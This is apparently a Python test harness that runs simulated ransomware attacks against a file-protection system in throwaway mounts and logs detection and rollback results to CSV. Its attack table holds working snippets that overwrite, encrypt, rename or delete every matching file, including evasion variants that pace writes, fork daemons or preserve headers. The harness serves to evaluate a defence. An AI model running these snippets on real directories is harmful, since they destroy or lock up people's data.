#!/usr/bin/env python3
"""Randomised attacker matrix. Usage: hf_attack.py OUT.csv --configs a,b --corpora x,y --attacks p,q --trials N --jobs J"""
import argparse, csv, concurrent.futures as cf, random, os, time, subprocess, signal, sys, json, shutil
from hf_lib import *

HDR = "import os,sys,time\nfiles=sorted(f for f in os.listdir('.') if f.startswith('doc'))\n"
LOOP = "for f in files:\n    "
def loop(body, pre=''): return HDR + pre + LOOP + body.replace('\n', '\n    ') + '\n'

ATTACKS = {
 'inplace_full': loop("fd=os.open(f,os.O_WRONLY); os.pwrite(fd,os.urandom(os.path.getsize(f)),0); os.close(fd)"),
 'trunc_rewrite': loop("n=os.path.getsize(f); open(f,'wb').write(os.urandom(n))"),
 'tmp_rename_over': loop("n=os.path.getsize(f); open(f+'.tmp','wb').write(os.urandom(n)); os.rename(f+'.tmp',f)"),
 'enc_delete': loop("n=os.path.getsize(f); open(f+'.enc','wb').write(os.urandom(n)); os.unlink(f)"),
 'rename_only': loop("os.rename(f,f+'.locked')"),
 'chunk256': loop("fd=os.open(f,os.O_WRONLY)\nfor o in range(0,os.path.getsize(f),256): os.pwrite(fd,os.urandom(256),o)\nos.close(fd)"),
 'intermittent': loop("fd=os.open(f,os.O_WRONLY); sz=os.path.getsize(f)\nfor o in range(0,sz,12288): os.pwrite(fd,os.urandom(min(4096,sz-o)),o)\nos.close(fd)"),
 'header_footer': loop("fd=os.open(f,os.O_WRONLY); sz=os.path.getsize(f); os.pwrite(fd,os.urandom(512),0); os.pwrite(fd,os.urandom(512),max(0,sz-512)); os.close(fd)"),
 'sig_preserving': loop("fd=os.open(f,os.O_WRONLY); sz=os.path.getsize(f); os.pwrite(fd,os.urandom(sz-8),8); os.close(fd)"),
 'hex_lowentropy': loop("n=os.path.getsize(f); open(f,'wb').write(os.urandom(n//2).hex().encode())"),
 'paced_1.4s': loop("fd=os.open(f,os.O_WRONLY); os.pwrite(fd,os.urandom(os.path.getsize(f)),0); os.close(fd); time.sleep(1.4)"),
 'forked_per_file': HDR + "import subprocess\nfor f in files:\n    subprocess.run(['python3','-c',\"import os,sys; f=sys.argv[1]; fd=os.open(f,os.O_WRONLY); os.pwrite(fd,os.urandom(os.path.getsize(f)),0); os.close(fd)\",f])\n",
 'daemonized_per_file': HDR + "for f in files:\n    pid=os.fork()\n    if pid==0:\n        os.setsid()\n        if os.fork()==0:\n            fd=os.open(f,os.O_WRONLY); os.pwrite(fd,os.urandom(os.path.getsize(f)),0); os.close(fd); os._exit(0)\n        os._exit(0)\n    os.waitpid(pid,0); time.sleep(0.12)\n",
 'exfil_delete': loop("d=open(f,'rb').read(); os.makedirs('/tmp/hf_exfil',exist_ok=True); open('/tmp/hf_exfil/'+f,'wb').write(d); os.unlink(f)"),
}

# Read-transform-write attackers (what real ransomware does: read the plaintext, encrypt, write back)
RW = "import hashlib\ndef ks(n,k=os.urandom(16)):\n    out=b''\n    c=0\n    while len(out)<n:\n        out+=hashlib.sha256(k+c.to_bytes(8,'little')).digest(); c+=1\n    return out[:n]\ndef enc(d): return bytes(a^b for a,b in zip(d,ks(len(d))))\n"
ATTACKS.update({
 'rw_inplace': loop(RW and "d=open(f,'rb').read(); fd=os.open(f,os.O_WRONLY); os.pwrite(fd,enc(d),0); os.close(fd)", pre=RW),
 'rw_trunc': loop("d=open(f,'rb').read(); open(f,'wb').write(enc(d))", pre=RW),
 'rw_chunk4k': loop("fd=os.open(f,os.O_RDWR); o=0\nwhile True:\n    b=os.pread(fd,4096,o)\n    if not b: break\n    os.pwrite(fd,enc(b),o); o+=len(b)\nos.close(fd)", pre=RW),
 'rw_tmp_rename': loop("d=open(f,'rb').read(); open(f+'.tmp','wb').write(enc(d)); os.rename(f+'.tmp',f)", pre=RW),
 'rw_paced_1.4s': loop("d=open(f,'rb').read(); fd=os.open(f,os.O_WRONLY); os.pwrite(fd,enc(d),0); os.close(fd); time.sleep(1.4)", pre=RW),
})
TIMEOUT = {'paced_1.4s': 60, 'rw_paced_1.4s': 60, 'daemonized_per_file': 40}

def run_trial(args):
    cfgname, corpus, attack, trial, seed = args
    rng = random.Random(seed)
    nfiles = rng.randint(16, 32)
    if os.environ.get('HF_NFILES'): nfiles = int(os.environ['HF_NFILES'])
    name = f'a_{cfgname}_{corpus}_{attack}_{trial}'
    m = Mount(name, PRESETS[cfgname])
    res = dict(cfg=cfgname, corpus=corpus, attack=attack, trial=trial, seed=seed, nfiles=nfiles)
    try:
        orig = make_corpus(m.B, corpus, nfiles, rng)
        m.start(); time.sleep(0.5)
        t0 = time.time()
        p = subprocess.Popen(['sh', '-c', 'python3 -c "$0"; true', ATTACKS[attack]], cwd=m.M, start_new_session=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        deadline = t0 + TIMEOUT.get(attack, 25)
        while time.time() < deadline:
            if p.poll() is not None: break
            if any(e.get('type') == 'detect' for e in m.events()): time.sleep(0.2); break
            time.sleep(0.1)
        time.sleep(0.4)
        ev = m.events()
        det = [e for e in ev if e.get('type') == 'detect']
        res['detected'] = int(bool(det))
        res['time_to_detect_s'] = round((det[0]['ts'] - ev[0]['ts']) / 1000 - 0.5, 2) if det else ''
        touched = set()
        for e in ev:
            if e.get('type') == 'detect': break
            if e.get('type') == 'write' and e.get('path'): touched.add(e['path'].replace('.locked', '').replace('.enc', '').replace('.tmp', ''))
        res['files_touched_before_detect'] = len(touched) if det else ''
        # live view right at the freeze (or when the attacker ended), no manual action
        if os.environ.get("HF_DEBUG"): print("stage attack-done", det and "det" or "nodet", flush=True)
        live = sum(1 for n, h in orig.items() if md5_file(os.path.join(m.M, n)) == h)
        if os.environ.get("HF_DEBUG"): print("stage live", flush=True)
        res["live_intact"] = live
        # stop the attacker, then settle (commit window) and look at the durable state
        try: os.killpg(p.pid, signal.SIGKILL)
        except Exception: pass
        pass
        time.sleep(3.0)
        res['durable_intact_no_recovery'] = sum(1 for n, h in orig.items() if md5_file(os.path.join(m.B, n)) == h)
        ok = m.rollback_latest() if det else False
        time.sleep(0.5)
        res['rolled_back'] = int(ok)
        res['final_intact'] = sum(1 for n, h in orig.items() if md5_file(os.path.join(m.B, n)) == h)
        res['ambiguous_events'] = sum(1 for e in ev if e.get('type') == 'ambiguous')
        res['cluster_events'] = sum(1 for e in ev if e.get('type') == 'cluster')
        res['soft_events'] = sum(1 for e in ev if e.get('type') == 'detect_soft')
        # Model an operator who acts on an ALERT (soft/cluster) when there was no hard detection: roll back the latest checkpoint
        ev2 = m.events(); alert = any(e.get('type') in ('detect_soft', 'cluster', 'ambiguous') for e in ev2)
        res['alert_rollback_intact'] = ''
        if not det and alert:
            sh([BIN + '/rrfs_ctl', m.M, 'promote', 'recover'], timeout=30); time.sleep(0.5)
            m.rollback_latest(); time.sleep(0.5)
            res['alert_rollback_intact'] = sum(1 for n, h in orig.items() if md5_file(os.path.join(m.B, n)) == h)
    except Exception as e:
        res['error'] = str(e)[:120]
    finally:
        m.stop(); shutil.rmtree(m.W, ignore_errors=True)
    return res

if __name__ == '__main__':
    ap = argparse.ArgumentParser(); ap.add_argument('out'); ap.add_argument('--configs', default='holdfast,restore_only,redirect_only')
    ap.add_argument('--corpora', default='mixed,unknown,text'); ap.add_argument('--attacks', default=','.join(ATTACKS))
    ap.add_argument('--trials', type=int, default=10); ap.add_argument('--jobs', type=int, default=3); ap.add_argument('--seed0', type=int, default=1000)
    a = ap.parse_args()
    os.makedirs(WORK, exist_ok=True)
    tasks = []
    for cfg in a.configs.split(','):
        for cor in a.corpora.split(','):
            for atk in a.attacks.split(','):
                for t in range(a.trials):
                    tasks.append((cfg, cor, atk, t, a.seed0 + t * 7919 + hash((cor, atk)) % 1000))
    random.Random(1).shuffle(tasks)
    fields = ['cfg','corpus','attack','trial','seed','nfiles','detected','time_to_detect_s','files_touched_before_detect','live_intact','durable_intact_no_recovery','rolled_back','final_intact','ambiguous_events','cluster_events','soft_events','alert_rollback_intact','error']
    done = 0
    have = set(); exists = os.path.exists(a.out) and os.path.getsize(a.out) > 0
    if exists:
        for r in csv.DictReader(open(a.out)):
            have.add((r['cfg'], r['corpus'], r['attack'], int(r['trial'])))
    tasks = [t for t in tasks if (t[0], t[1], t[2], t[3]) not in have]
    with open(a.out, 'a' if exists else 'w', newline='') as fo, cf.ThreadPoolExecutor(a.jobs) as ex:
        w = csv.DictWriter(fo, fieldnames=fields, extrasaction='ignore')
        if not exists: w.writeheader()
        for r in ex.map(run_trial, tasks):
            w.writerow(r); fo.flush(); done += 1
            if done % 20 == 0: print(f'{done}/{len(tasks)}', flush=True)
